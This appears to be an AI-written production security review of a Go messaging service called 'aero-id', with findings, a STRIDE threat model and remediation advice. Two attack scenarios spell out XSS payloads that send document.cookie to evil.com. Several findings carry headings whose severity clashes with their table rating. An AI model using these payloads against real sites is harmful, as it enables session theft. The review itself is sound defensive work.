Now I have a thorough understanding of the codebase. Let me compile the comprehensive security review.

---

# Principal Security Engineer: Production Readiness Security Review

**Review Date**: 2026-07-12
**Scope**: Current aero-id codebase + 5 planned extension directions (36 tasks)
**Codebase Baseline**: `main` branch, `make test ✅`, `make lint ✅`

---

## 1. Authentication & Authorization

### Finding 1.1 — CRITICAL: Actor-UID Trust Bypass in Reaction Handlers

| Field | Value |
|-------|-------|
| **Category** | Authorization |
| **Severity** | **High** |
| **Title** | HTTP handler extracts actor from context but passes as unvalidated parameter |
| **Location** | `internal/handler/http/message.go:145-175` (`ReactToMessage`, `UnreactMessage`) |
| **Description** | The HTTP handlers extract `actor` from the Gin context via `service.ActorFrom()` and pass it to the service method as a parameter. The service layer trusts the parameter without cross-verifying it against the context's authenticated actor. This breaks the actor-is-authority pattern used elsewhere (`mustActor()` extracts from context directly). |
| **Attack Scenario** | If a new code path or interceptor inadvertently allows an attacker-controlled `actor_uid` to be set in the context, the reaction endpoints become privilege escalation points — user A can react to user B's messages on user A's behalf by passing actorUID=`victim_uid`. Alternatively, a developer error in a future handler that doesn't properly extract the actor could lead to acting on behalf of another user. |
| **Impact** | Privilege escalation: ability to react to messages as any user. In group message scenarios (planned), this could extend to sending/deleting messages as another user. |
| **Recommendation** | Change the service methods to extract `actor` from `ctx` directly via `mustActor(ctx)` instead of accepting it as a parameter. The HTTP handler becomes: `if err := h.messages.ReactToMessage(c.Request.Context(), id); err != nil {`. Update `ReactToMessage` and `UnreactMessage` signatures to not take `actorUID string`. |
| **Effort** | S (< 1 day) |

### Finding 1.2 — HIGH: Token Revocation Window — Up to 6 Minutes

| Field | Value |
|-------|-------|
| **Category** | Authentication |
| **Severity** | **Medium** |
| **Title** | Stale TTL allows up to 6-minute token-revocation bypass window |
| **Location** | `internal/config/config.go` (SSOConfig.StaleTTL = 300s), `internal/sso/token_cache.go` (RunCleaner 30s interval) |
| **Description** | `stale_ttl = 300s` means an expired/revoked SSO token continues to be accepted by aero-id for up to 300 seconds (plus up to 30s for cache sweep = ~5.5 min) after SSO revokes it. This is documented as acceptable for SSO outage tolerance, but in the revoked-token scenario, it's a security window. |
| **Attack Scenario** | A user is terminated/deactivated in SSO. The SSO revokes their token immediately. An attacker who captured the token (or the now-malicious ex-employee) can continue making authenticated calls for ~5.5 minutes. |
| **Impact** | Unauthorized access to a deactivated account for up to 6 minutes. |
| **Recommendation** | 1) Reduce `stale_ttl` to 30-60s (tolerable for SSO blips, but tight for revocation). 2) Add a token revocation check every N requests (probabilistic validation). 3) Document that SSO must support token revocation webhooks for real-time enforcement. 4) Add a `TokenValidationMode` config: `strict` (no stale), `tolerant` (current), `hybrid` (stale on SSO error, strict on success). |
| **Effort** | S (config change) |

### Finding 1.3 — MEDIUM: ReactToMessage Service Doesn't Verify Actor in Context

| Field | Value |
|-------|-------|
| **Category** | Authorization |
| **Severity** | **High** |
| **Title** | Service `ReactToMessage` trusts caller-provided actorUID without cross-validation |
| **Location** | `internal/service/message.go:195-220` |
| **Description** | `ReactToMessage` takes `actorUID string` as a parameter and uses it directly for `canReadMessage(actorUID, m)` and `s.messages.ReactToMessage(ctx, messageID, actorUID)`. Unlike `Send`, `Get`, `Edit`, `Delete` which all call `mustActor(ctx)`, this method trusts the caller. If the HTTP/gRPC handler ever passes a wrong value, authorization is bypassed. |
| **Attack Scenario** | A compromised handler passes `actorUID = "admin_uid"` to `ReactToMessage`, allowing the caller to react to messages they have no right to react to. |
| **Impact** | Authorization bypass on reaction operations. |
| **Recommendation** | Same as Finding 1.1 — move actor extraction inside the method: `actor, err := mustActor(ctx)`. Remove `actorUID` parameter entirely. |
| **Effort** | S |

### Finding 1.4 — MEDIUM: gRPC Auth Bypass for infra Methods — No Token Validation

| Field | Value |
|-------|-------|
| **Category** | Authentication |
| **Severity** | **Low** |
| **Title** | Infrastructure gRPC methods bypass all auth — no token validation |
| **Location** | `internal/handler/grpc/server.go:135-141` (`AuthInterceptor`) |
| **Description** | `grpc.health.v1.*` and `grpc.reflection.*` methods bypass auth entirely. This is standard practice for health probes. However, `reflection_enabled` defaults to `false` in config, and the code correctly gates reflection behind this flag. The risk here is if an operator enables reflection in production — the full RPC surface is exposed without auth. |
| **Attack Scenario** | An operator sets `reflection_enabled: true` in production. An attacker with network access can use `grpcurl` to enumerate all RPC methods and then craft auth-bypass calls if any perimeter controls are misconfigured. |
| **Impact** | RPC enumeration and potential data leakage (method names, parameter shapes). |
| **Recommendation** | Keep `reflection_enabled: false` in production. Add a startup warning log when reflection is enabled. Consider adding a separate port for reflection (like gRPC health). |
| **Effort** | S |

---

## 2. Input Validation

### Finding 2.1 — HIGH: SVG/XSS Vector in File Uploads — No Content-Type Enforcement

| Field | Value |
|-------|-------|
| **Category** | Input Validation |
| **Severity** | **High** |
| **Title** | Allowed MIME types list is empty by default — accepts SVG with JS |
| **Location** | `internal/service/file.go:88-91` (`mimeAllowed`), `configs/config.yaml:49` (`allowed_mime_types: []`) |
| **Description** | The `allowed_mime_types` configuration is empty by default (`[]`), which means `mimeAllowed()` returns `true` for every content type. `image/svg+xml` is accepted. SVG files can contain `<script>` tags executing arbitrary JavaScript in the browser context. The MIME type is taken from the `Content-Type` header, which the client supplies — no server-side content sniffing or magic-byte verification is performed. |
| **Attack Scenario** | 1. Attacker uploads an SVG file with embedded JavaScript: `<script>fetch('https://evil.com/steal?c='+document.cookie)</script>`. 2. A victim views the SVG file in their browser via aero-id's download endpoint. 3. The browser executes the script in the aero-id origin context, leaking cookies/session data. |
| **Impact** | Stored XSS. Victim's session cookie leaked to attacker. Potential account takeover. |
| **Recommendation** | 1) **Immediate**: Block `image/svg+xml` by default in `allowed_mime_types` by documenting it explicitly. 2) Add server-side magic-byte verification (`http.DetectContentType()` or similar) to validate the actual content matches the claimed MIME type. 3) When serving files with `Content-Type` derived from user input, add `X-Content-Type-Options: nosniff` header. 4) Serve SVG files with `Content-Disposition: attachment` unless explicitly previewed. |
| **Effort** | M (1-2 days) |

### Finding 2.2 — MEDIUM: Upload Size Cap is Bypassable via Chunked/Compressed Uploads

| Field | Value |
|-------|-------|
| **Category** | Input Validation |
| **Severity** | **Medium** |
| **Title** | File upload size limit has a TOCTOU race — cappedReader reads before storage write |
| **Location** | `internal/service/file.go:56-72` (`Create` — cappedReader), `internal/storage/local.go:51-66` (`Put` — io.Copy) |
| **Description** | The `cappedReader` wraps the upload stream and tracks bytes read. When the limit is exceeded, `Read()` returns `errFileTooLarge`. However: 1) The `cappedReader` is only applied to the `Put()` path — the `PresignUpload` → `CompleteUpload` path (S3 direct upload) is NOT subject to the size check. 2) On the local path, `io.Copy` writes to disk as it reads, so a file just over the limit is partially written and then deleted — creating a window where a partial blob exists on disk. 3) There's no decompression bomb protection — a 1KB gzipped file can expand to gigabytes. |
| **Attack Scenario** | 1. Attacker uploads a 1KB gzip bomb that expands during processing (if a pipeline decompresses it). 2. Attacker sends a 51MB file to a 50MB-limit server — the file is partially written to disk, consuming disk space until deleted. 3. Attacker uses `PresignUpload` to bypass the size limit entirely. |
| **Impact** | Disk fill (DoS), partial file leakage, size-limit bypass via presigned upload. |
| **Recommendation** | 1) Apply size enforcement in `CompleteUpload` by stat'ing the object after upload completes. 2) Add a download-size cap for pipeline processing (max decompressed bytes). 3) Set S3 presigned URL expiry to seconds, not hours. 4) Document that `PresignUpload` trusts the client about written size — add a stat-verify after completion. |
| **Effort** | M (1-2 days) |

### Finding 2.3 — MEDIUM: SQL Injection via raw `gorm.Exec` in Migrations — Not in Runtime

| Field | Value |
|-------|-------|
| **Category** | Input Validation |
| **Severity** | **Info** |
| **Title** | Migration SQL files are not parametrized — but not user-facing |
| **Location** | `migrations/*.sql` |
| **Description** | Migration files use string interpolation for table/column names. However, migrations are applied as static files from the `migrations/` directory, not from user input. This is standard practice. Noted for completeness: if future migration code interpolates user-controlled values, injection is possible. |
| **Impact** | None in current design — informational only. |
| **Recommendation** | Ensure any future programmatic migrations (e.g., `AutoMigrate` with schema changes) use GORM's `Migrator()` API rather than raw SQL. |
| **Effort** | N/A (informational) |

---

## 3. Cryptography

### Finding 3.1 — MEDIUM: HMAC Key Exposed in Config — Signed into Repo

| Field | Value |
|-------|-------|
| **Category** | Cryptography |
| **Severity** | **High** |
| **Title** | Default signing key is committed to git in configs/config.yaml |
| **Location** | `configs/config.yaml:58` (`signing_key: change-me-please-very-long-random`) |
| **Description** | The signing key for local-storage presigned URLs is present in the default config file with a placeholder value. While documented as "change me", the committed value is a non-random string. If any deployment uses this default, the HMAC presign URL protection is trivially forgeable. |
| **Attack Scenario** | An attacker discovers the default signing key (publicly visible in source). They forge presigned download URLs for any file in the local storage backend, bypassing authentication. |
| **Impact** | Unauthenticated access to all files stored in local storage. |
| **Recommendation** | 1) Add a startup-time check that logs a WARNING if `signing_key` matches the known placeholder. 2) In production deployment docs, require `AERO_ID_SIGNING_KEY` env var which overrides the config value. 3) Remove the default value and make `signing_key` fail validation when it matches a known default. |
| **Effort** | S |

### Finding 3.2 — MEDIUM: Presigned URL HMAC Uses SHA256 — Adequate but Missing Key Rotation

| Field | Value |
|-------|-------|
| **Category** | Cryptography |
| **Severity** | **Medium** |
| **Title** | No HMAC key rotation mechanism for presigned download URLs |
| **Location** | `internal/storage/local.go:99-117` (`sign`, `VerifyPresignedURL`) |
| **Description** | The HMAC-SHA256 signing key is loaded once at startup and never rotated. A leaked key requires a service restart to change. There's no key versioning — URLs signed with an old key are invalidated immediately on rotation. The `PresignGet` URL uses query parameters (`key`, `exp`, `sig`) without additional context-binding (e.g., binding to the requesting IP or User-Agent). |
| **Attack Scenario** | An attacker intercepts a user's presigned download URL (in network logs, browser history, referrer headers). They can replay this URL from any IP until it expires (TTL is configurable). |
| **Impact** | Replay of presigned download URLs from arbitrary IPs. |
| **Recommendation** | 1) Add key version ID to the signature payload, allowing gradual key rotation. 2) Consider binding presigned URLs to the requesting user's IP or a session-derived nonce. 3) Document that presigned URLs are bearer tokens — keep TTL short (minutes, not hours). |
| **Effort** | M (key rotation support) |

### Finding 3.3 — INFO: No TLS for Local Development — Acceptable for Dev

| Field | Value |
|-------|-------|
| **Category** | Cryptography |
| **Severity** | **Low** |
| **Title** | SSO connection uses no TLS by default (insecure: true) |
| **Location** | `configs/config.yaml:34` (`insecure: true`), `internal/sso/client.go:75-85` |
| **Description** | Dev config uses `insecure: true` for the SSO gRPC connection. Production must set `insecure: false` (or omit it, as the zero value is false). The code supports TLS with mTLS and certificate pinning — well-implemented. |
| **Impact** | In production with `insecure: true`, all SSO communication is in plaintext. Token validation responses and user data are visible to network attackers. |
| **Recommendation** | Add a startup warning if `insecure: true` in a non-dev environment. Document production TLS requirements in the deployment guide. |
| **Effort** | S |

---

## 4. Session Management

### Finding 4.1 — MEDIUM: Bearer Token Cached in Memory — No Session Invalidation Endpoint

| Field | Value |
|-------|-------|
| **Category** | Session Management |
| **Severity** | **Medium** |
| **Title** | No API endpoint for server-side token cache invalidation |
| **Location** | `internal/sso/token_cache.go` (no `Evict`/`Invalidate` method exposed publicly) |
| **Description** | aero-id maintains an in-memory cache of validated tokens (`sync.Map` + periodic sweep). There is no endpoint to invalidate a cached token. If a user's token is compromised and reported, the only way to purge it from aero-id's cache is to wait for TTL+stale expiry (~6 min) or restart the server. |
| **Attack Scenario** | User detects their device was stolen and reports their token stolen to support. Support cannot force-invalidate the token in aero-id's cache — it remains valid for up to 6 minutes. |
| **Impact** | Delayed token invalidation in incident response scenarios. |
| **Recommendation** | 1) Expose a `TokenCache.Invalidate(token string)` method. 2) Add an internal gRPC endpoint `/aero_id.v1.Admin/InvalidateToken` (auth gated). 3) For the planned Redis shared-state (Direction 2), add pub/sub token invalidation across all instances. |
| **Effort** | M (add invalidation endpoint) |

### Finding 4.2 — MEDIUM: Idempotency Key Replay Allows Response Manipulation

| Field | Value |
|-------|-------|
| **Category** | Session Management |
| **Severity** | **Medium** |
| **Title** | Idempotency key scope is (uid, endpoint, key) — no request-body binding |
| **Location** | `internal/idempotency/store.go:30-35` (`Reserve`), `internal/middleware/idempotency.go:22-35` |
| **Description** | The idempotency key is scoped to `(actor_uid, HTTP_method+path, key)`. The request body is NOT part of the scope. An attacker can send `POST /v1/messages` with idempotency key `abc` and body `{"to_uid": "victim", "content": "good"}`; then send another `POST /v1/messages` with the same key `abc` but body `{"to_uid": "victim", "content": "malicious"}`. The second request gets the first response replayed, but if the first request's handler was still processing, the second request's body might be processed instead. |
| **Attack Scenario** | 1. User A sends `POST /v1/messages` with idempotency key `X`, body `{"to_uid": "B", "content": "hello"}`. 2. Attacker intercepts the request and changes the body to `{"to_uid": "B", "content": "I hate you"}`. 3. The server processes the modified request instead. 4. The attacker could also just replay the key with a different body and have the replayed response served to the legitimate client. |
| **Impact** | Response manipulation, potential message forgery (though nested in idempotency). |
| **Recommendation** | 1) Include a SHA-256 hash of the request body in the idempotency key scope (e.g., scope as `(uid, endpoint, body_hash, key)`). 2) On replay with different body, return 422 Unprocessable Entity. |
| **Effort** | M |

---

## 5. Data Protection

### Finding 5.1 — HIGH: No Content-Disposition Header on File Downloads

| Field | Value |
|-------|-------|
| **Category** | Data Protection |
| **Severity** | **Medium** |
| **Title** | File download endpoint serves user-supplied content without safe Content-Disposition |
| **Location** | `internal/handler/http/file.go:141-153` (`Download` handler) |
| **Description** | The `Download` handler streams the file content verbatim with `c.Status(http.StatusOK)` and `io.Copy`. It does not set `Content-Disposition: attachment` or sanitize the filename. Combined with user-controlled `Content-Type` (from `File.MimeType`), this means: 1) A `.html` file renders as HTML in the browser. 2) An SVG with JavaScript executes. 3) The browser's built-in MIME sniffing may override the Content-Type. |
| **Attack Scenario** | User uploads `evil.html` containing `<script>document.location='https://evil.com/steal?c='+document.cookie</script>`. Victim visits the file's download URL. Browser renders the HTML, executes the script. |
| **Impact** | Stored XSS, session theft, CSRF token leakage. |
| **Recommendation** | 1) Always set `Content-Disposition: attachment; filename="..."` for all file downloads (the file download handler is `GET /files/dl`). 2) Set `X-Content-Type-Options: nosniff` globally. 3) Set `Content-Type` to `application/octet-stream` for downloads unless the MIME type is explicitly safe (e.g., images, PDFs served inline). |
| **Effort** | S |

### Finding 5.2 — MEDIUM: Sensitive Data in Error Messages

| Field | Value |
|-------|-------|
| **Category** | Data Protection |
| **Severity** | **Medium** |
| **Title** | Internal error details can leak storage key paths |
| **Location** | `internal/storage/local.go:52-66` (Put/Get/Delete errors return fmt.Errorf with path), `internal/service/file.go:75-80` |
| **Description** | Storage backend errors are wrapped with `fmt.Errorf` including the file path (`create: /data/files/owner/2026/07/uuid-partial`). These propagate to the service layer, which wraps them again as `Internal` errors. The HTTP handler may return these details if the error format includes internal details. The `AppError` wrapping preserves the cause chain — if the error is logged (which it is via access logs), storage paths are exposed in logs. |
| **Attack Scenario** | An internal error during file upload leaks `/data/files/...` in the error message returned to the client, revealing the local filesystem layout. Combined with other information, this aids targeted attacks. |
| **Impact** | Information disclosure (filesystem layout, storage structure). |
| **Recommendation** | 1) Never include filesystem paths in user-facing error messages. 2) The `AppError.Internal().Wrap(err)` correctly separates user message from cause — ensure all handler error paths use the `AppError.Message` (not stringifying the full error chain). 3) In JSON error responses, never include `.Cause` or internal stack traces. 4) Add a test that asserts no storage path leaks into error responses. |
| **Effort** | S |

### Finding 5.3 — MEDIUM: Idempotency Response Body Stored in Plaintext in DB

| Field | Value |
|-------|-------|
| **Category** | Data Protection |
| **Severity** | **Medium** |
| **Title** | Idempotency table stores full response bodies in plaintext indefinitely |
| **Location** | `internal/idempotency/store.go:20-40` (`idempotencyRow`), `internal/idempotency/store.go:106-121` (`Complete`) |
| **Description** | `idempotency_keys` table stores the full HTTP response body (`response bytea`) and status code in plaintext. These responses may contain sensitive data (messages, file metadata, user lists). The TTL determines how long they're kept (default 24h). The cleaner deletes expired rows, but until then, anyone with DB access can read response bodies of arbitrary idempotent requests. |
| **Attack Scenario** | A DBA with read access to the `idempotency_keys` table can read all idempotent responses, including message contents sent by users. |
| **Impact** | Sensitive message data stored in an unexpected location (idempotency table). |
| **Recommendation** | 1) Encrypt the `response` column at rest using AES-256-GCM with a key derived from the `(uid, endpoint, key)` tuple. 2) Or, don't store the full response body — store only the status code and a content hash, and require the client to cache responses. 3) Reduce default idempotency TTL from 24h to 5m. |
| **Effort** | L (encryption at rest in idempotency table) |

---

## 6. Threat Model — STRIDE Analysis

### Spoofing

| Finding | Severity | Detail |
|---------|----------|--------|
| **Token reuse via stale cache** | **High** | Stale TTL allows token reuse 5+ min after SSO revocation (Finding 1.2) |
| **HMAC presign key hardcoded** | **High** | Default signing key in config file allows forged download URLs (Finding 3.1) |
| **System message forgery** | **Good** | Service correctly blocks `Send()` with `IsSystem()` kind — only `SendSystem` bypasses actor check. |
| **Upcoming: Group message spoofing** | **Medium** | Planned group message Service (TASK-005/006) must verify sender is an active group member before allowing sends. The design docs mention this but no code review yet. |

### Tampering

| Finding | Severity | Detail |
|---------|----------|--------|
| **Idempotency key body manipulation** | **Medium** | No body-hash binding in idempotency key scope (Finding 4.2) |
| **File checksum is content-addressed but not mandatory** | **Medium** | The upload pipeline computes SHA-256 but doesn't require the client to send a matching checksum. If a blob is corrupted during upload (network error), the stored checksum won't match the actual bytes. |
| **Upcoming: Webhook event tampering** | **Medium** | Planned webhook delivery (TASK-034) uses HMAC-SHA256 signing — proper. But if the signing key is leaked (stored in `WebhookSubscription.secret`), all events to that subscriber are forgeable. The key must be encrypted at rest (noted in task design but AES-256-GCM mentioned without key rotation). |

### Repudiation

| Finding | Severity | Detail |
|---------|----------|--------|
| **Audit logging is optional** | **Medium** | `WithFileAuditLogger` and `WithMessageAuditLogger` are optional options. If an operator starts the service without them, no audit trail exists for files/messages. |
| **Outbox events are not replayed after publish** | **Low** | Once `published_at` is set, the event is not re-examinable. For full non-repudiation, a separate audit table (immutable) should record who did what. |
| **Upcoming: Webhook delivery history** | **Good** | TASK-035 plans `webhook_deliveries` table for full delivery history — good for non-repudiation. |

### Information Disclosure

| Finding | Severity | Detail |
|---------|----------|--------|
| **SVG upload → XSS** | **High** | SVG files with JavaScript scripts served in-browser (Finding 2.1, 5.1) |
| **Storage path leakage in errors** | **Medium** | Error wrapping exposes filesystem layout (Finding 5.2) |
| **Idempotency body stored in plaintext** | **Medium** | All idempotent request responses stored in `idempotency_keys` (Finding 5.3) |
| **CORS allows all origins by default** | **Low** | Empty `origins` → `Access-Control-Allow-Origin: *` — any website can read responses from authenticated APIs if the user has valid cookies/sessions. Since aero-id uses Bearer tokens (not cookies), the practical risk is limited, but not zero (e.g., if a token is in `localStorage` and a script reads it). |
| **Upcoming: Conversation aggregation** | **Low** | TASK-026's `ListConversations` must ensure soft-deleted messages are excluded. Otherwise, a deleted message may appear in the sender's conversation list. The design mentions this correctly. |
| **Upcoming: Pipeline error leakage** | **Medium** | TASK-024 plans pipeline failure details in `File.Meta["error"]`. These must not be leaked to non-owners via the API. |

### Denial of Service

| Finding | Severity | Detail |
|---------|----------|--------|
| **No decompression bomb protection** | **High** | No limit on decompressed file size during pipeline processing. A crafted 1KB `.zip` or `.gz` could expand to gigabytes (Finding 2.2). |
| **Rate limiter is per-instance — bypassable with N instances** | **Medium** | Current rate limiter is in-memory per instance. With N instances behind a load balancer, effective rate limit is N× configured. The planned Redis shared state (TASK-017) addresses this but is P1.5, not P0. |
| **gRPC max_recv_msg_size set to 4MB** | **Good** | Config properly limits gRPC message sizes. |
| **Keepalive min ping interval enforced (10s)** | **Good** | Prevents clients from flooding the gRPC server with pings (Slowloris for gRPC). |
| **Upcoming: Webhook delivery backpressure** | **Medium** | TASK-034 correctly identifies that a slow webhook subscriber (5xx) will cause outbox table growth. Auto-pause is planned, but what happens to the queue between `max_consecutive_failures` and pause? The outbox table can grow unboundedly. Need a maximum backlog size. |
| **Upcoming: Thumbnail generation resource exhaustion** | **High** | TASK-022 plans thumbnail generation using FFmpeg/ImageMagick. A crafted image (e.g., "image bomb" — small valid image that decompresses to huge dimensions) can exhaust memory or disk. Must limit max pixel dimensions and use a subprocess with resource limits. |

### Elevation of Privilege

| Finding | Severity | Detail |
|---------|----------|--------|
| **Actor UID trust bypass in reactions** | **High** | Service trusts caller-provided actorUID (Finding 1.1, 1.3) |
| **System message path exists but is gated** | **Good** | `SendSystem` is in service but only callable by internal code (notification dispatcher, outbox handlers) — not exposed via HTTP/gRPC. |
| **Upcoming: Group membership management** | **High** | TASK-005 must enforce that only group admins can invite/remove members. If `RemoveMember` is callable by any member, a user can kick others. The design mentions role checks but this must be carefully implemented. |
| **Upcoming: Webhook subscription ownership** | **Medium** | TASK-033 plans `POST /v1/webhooks`, `DELETE /v1/webhooks/:id`. Each subscription must be scoped to `owner_uid`. A user must not be able to delete another user's webhook. The handler must verify `owner_uid` matches the authenticated actor. |

---

## 7. Upcoming Extension Security Risks

### Direction 1: Group Messages (TASK-001 → TASK-010)

| Risk | Severity | Recommendation |
|------|----------|---------------|
| **Leaving group ≠ losing access to future messages** | **High** | When a user leaves a group (`LeaveGroup`), the current design keeps `left_at` and filters messages by `created_at < left_at`. This is fragile — if `left_at` is mis-set, the user can see future messages. **Use a membership-gate pattern**: after leaving, the user is simply no longer in the participants list for new messages. |
| **Group invitation acceptance — no replay prevention** | **Medium** | If group invitations don't expire, a stale invitation can be accepted years later. Add TTL to `group_invites` rows. |
| **N² outbox events for large groups** | **Medium** | TASK-006 emits N-1 outbox events per group message. For a 1000-member group, that's 999 outbox rows. If event processing is delayed, all 999 events are batched into a single relay drain — potential memory pressure. Use a single aggregate event `group.message.sent` with `member_count` and `member_ids` — the dispatcher can fan-out from a single event. |
| **Group name as XSS vector** | **Medium** | Group names in notifications (TASK-007) must be HTML-escaped if rendered in a web context. |

### Direction 2: Redis Shared State (TASK-011 → TASK-018)

| Risk | Severity | Recommendation |
|------|----------|---------------|
| **Redis credentials in config (AERO_ID_REDIS_PASSWORD)** | **High** | The design correctly notes password via env. But Redis authentication (`AUTH`) sends the password in plaintext — use TLS for Redis in production. |
| **Cache poisoning via L2 Redis** | **High** | If Redis is compromised (e.g., exposed on the network without auth), an attacker can inject fake SSO token → uid mappings into the L2 cache. The `singleflight` group prevents duplicate old-value serving, but doesn't validate that the cached value came from a trusted source. **Add a HMAC tag to cached values** signed with a separate key, so tampering is detectable. |
| **L2 cache shared across instances — no tenant isolation** | **Medium** | All instances share the same Redis keyspace for SSO cache. If one instance's traffic pattern creates a key prefix collision, authentication state leaks. Use instance-specific prefixes (e.g., `sso:token:${key}`). |
| **Leader election: brain-split race condition** | **High** | Design mentions 10s lease with periodic renewal. If there's a network partition >10s, two instances may both believe they're leader. The `FOR UPDATE SKIP LOCKED` on the outbox table is a compensatory control — but `SkipLocked` alone doesn't prevent two leaders from processing different events. **Solution**: Add an fencing token (epoch) that increments on each leader handoff. |
| **L1+L2 cache: stale read amplification** | **Medium** | With L1 TTL of 30s and L2 TTL of 5min, if a token is revoked, it stays in L2 for 5 minutes. Every instance will serve the revoked token from L1 (30s) then from L2 (5min). The stale window compounds across instances. **Solution**: Make L2 TTL short (same as L1, 30-60s) and use L2 only for cross-instance coordination, not as a longer-lived cache. |

### Direction 3: File Pipeline (TASK-019 → TASK-025)

| Risk | Severity | Recommendation |
|------|----------|---------------|
| **Image bomb / decompression bomb in pipeline** | **Critical** | Thumbnail generation with `imaging` library or FFmpeg can be fed a crafted image that decompresses to gigabytes (e.g., very high dimension JPEG or "Zip of Death"). **Mitigations**: 1) Set max image dimensions (e.g., 4096x4096 pixels). 2) Run pipeline steps in a subprocess with ulimit (memory, CPU, file descriptors). 3) Set a timeout per pipeline step. |
| **FFmpeg subprocess: command injection via filename** | **High** | If the pipeline constructs FFmpeg commands using the file name or user-supplied metadata, an attacker can inject shell commands. **Never** pass user input to shell commands. Use Go's `os/exec` with explicit argument arrays (not shell strings). |
| **Temporary ref counting: TOCTOU race** | **Medium** | TASK-025 adds temporary `storage_ref` entries to prevent GC from deleting in-flight blobs. If the ref is added AFTER the outbox event `file.uploaded` is emitted but BEFORE the pipeline worker picks it up, GC can delete the blob in the gap. **Fix**: Add the temp ref in the same transaction as setting `File.Status = Pending`. |
| **Pipeline timeouts for FFmpeg** | **High** | A large video file (multi-GB) can take hours to transcode, blocking the pipeline worker. Must have per-step timeouts and cancellation. The design mentions this but it must be implemented before the pipeline goes to production. |
| **Virus scanning integration risk** | **Medium** | TASK-022/023 mentions optional ClamAV integration. ClamAV is resource-intensive and can be DoS'd with a crafted archive. Must run in a sandboxed subprocess with strict timeouts and memory limits. |

### Direction 4: Conversation Aggregation (TASK-026 → TASK-030)

| Risk | Severity | Recommendation |
|------|----------|---------------|
| **Soft-deleted message bypass in aggregation** | **Medium** | If `ListConversations` doesn't filter `WHERE deleted_at IS NULL`, users can see deleted messages in their conversation list. The design mentions this — ensure the lateral join query uses the same soft-delete filter as individual message queries. |
| **Data exposure: conversation list shows message previews** | **Medium** | `last_message_preview` in `ConversationSummary` leaks the content of the most recent message. If a user deletes a message after sending, the preview in the conversation list may still show the content. Consider storing a separate `last_preview` column truncated at N characters (e.g., 100). |

### Direction 5: Webhook Platform (TASK-031 → TASK-036)

| Risk | Severity | Recommendation |
|------|----------|---------------|
| **SSRF via webhook URL** | **Critical** | Webhook subscription allows users to set an arbitrary `url`. Without validation, an attacker can make aero-id send requests to internal services (e.g., `http://169.254.169.254/` for cloud metadata, `http://localhost:6379/` for Redis, internal APIs). **Mitigations**: 1) Reject private/loopback IPs in webhook URLs. 2) Allow-list allowed domains or URL patterns. 3) Run webhook delivery in a restricted network context (no access to internal services). |
| **Webhook secret stored in plaintext in DB** | **High** | TASK-031's `WebhookSubscription` entity has a `secret` field. The design says "encrypted storage" (AEAD AES-256-GCM) — this is mandatory. The key used for encryption must be from `AERO_ID_*` env, not committed. |
| **Webhook secret exposed on create** | **Medium** | TASK-033 says the `rotate-key` endpoint returns the new secret in the response "only once". The initial `Create` endpoint must also return the secret only in the initial response and never again. Log the secret exposure event for audit. |
| **Webhook delivery: TLS validation** | **Medium** | Webhook delivery must use TLS when the URL scheme is `https://`. If the URL uses custom ports or self-signed certs, validation must be strict. Offer a `skip_tls_verify` option only if explicitly opted in. |
| **Outbox table explosion from webhook backpressure** | **High** | If a subscriber is slow and `max_consecutive_failures` is high (or set to 0 for unlimited), the outbox table grows unboundedly. **Add a per-subscription maximum backlog** (e.g., 10,000 unprocessed events) that triggers auto-pause regardless of failure count. |
| **Webhook delivery history: response body can contain secrets** | **Medium** | TASK-035 stores the response body (truncated to 4KB) in `webhook_deliveries`. If the external service returns a response containing the webhook secret or other sensitive data, it's stored in plaintext. **Redact sensitive fields** before storing. |

---

## 8. Compliance Assessment

| Standard | Status | Notes |
|----------|--------|-------|
| **OWASP Top 10 (2021)** | Needs improvement | A01:Broken Access Control — Finding 1.1, 1.3. A03:Injection — Finding 2.1 (XSS). A05:Security Misconfiguration — Finding 3.1 (default keys). A06:Vulnerable Components — pipeline introduces FFmpeg. A08:Software and Data Integrity Failures — upcoming webhook SSRF. |
| **OWASP ASVS (v4.0)** | Partially compliant | V2 (Authentication): session management has gaps. V3 (Session Mgmt): no invalidation endpoint. V4 (Access Control): actor trust boundary issue. V5 (Validation): MIME type validation missing. V9 (Communications): TLS config valid but dev default is insecure. V12 (Data Protection): idempotency body in plaintext. |
| **GDPR** | Needs improvement | Article 17 (Right to Erasure): soft deletes everywhere — good. But: (1) Idempotency responses containing PII stored for 24h without clear erasure path. (2) Outbox events containing PII. (3) Webhook deliveries storing response bodies. All these need a data retention policy and programmatic erasure API. |
| **SOC 2** | Needs review | Common Criteria 6.1 (Logical Access): SSO auth is delegated — need SOC 2 certification from SSO provider. CC 6.7 (Encryption at rest): idempotency and webhook tables not encrypted. CC 7.1 (Monitoring): good metrics infrastructure planned. |
| **ISO 27001** | Needs review | A.9 (Access Control): needs RBAC for admin operations. A.12 (Operations Security): backup/restore procedures for file storage not documented. A.14 (System Acquisition): pipeline introduces new attack surface. |

---

## 9. Final Summary

### Overall Security Posture
**Needs Improvement** — The current codebase has solid fundamentals (proper layered architecture, correct actor-based authorization in most paths, no SQL injection surface, proper error handling separation). However, there are several **High-severity** issues in the current code that must be addressed before production deployment, and the planned extensions introduce multiple **Critical** and **High** risks (SSRF, image bombs, cache poisoning) that must be designed-in from the start.

### Top 3 Critical Issues (Must Fix Before Production)

| # | Issue | Severity | Fix |
|---|-------|----------|-----|
| 1 | **SVG/XSS via file uploads** | **Critical** | Block `image/svg+xml` by default, add magic-byte verification, set `X-Content-Type-Options: nosniff`, serve with `Content-Disposition: attachment` |
| 2 | **SSRF via webhook URLs (upcoming)** | **Critical** | Reject private IPs, allow-list domains, restrict webhook delivery network |
| 3 | **Image bomb / pipeline resource exhaustion (upcoming)** | **Critical** | Max image dimensions, ulimit sandboxing, per-step timeouts |

### Top 3 Quick Wins

| # | Fix | Effort | Impact |
|---|-----|--------|--------|
| 1 | **Remove default signing key from config** — startup warning + validation | 30 min | Prevents presigned URL forgery in deployments using default config |
| 2 | **Add `Content-Disposition: attachment` to file downloads** + `X-Content-Type-Options: nosniff` | 1 hour | Prevents stored XSS via SVG, HTML, JS uploads |
| 3 | **ActorUID extraction: move `mustActor(ctx)` inside `ReactToMessage`/`UnreactMessage`** | 2 hours | Closes authorization trust-bypass in reaction operations |

### Security Debt

| Debt Item | Origin | Lasting Impact |
|-----------|--------|---------------|
| **Idempotency response body in plaintext DB** | Current | PII exposure in unexpected table. **Fix**: encrypt or don't store |
| **No token invalidation endpoint** | Current | 6-minute revocation window. **Fix**: add invalidation gRPC endpoint |
| **CORS allow-all by default** | Current | Permissive cross-origin access. **Fix**: require explicit origins in prod config |
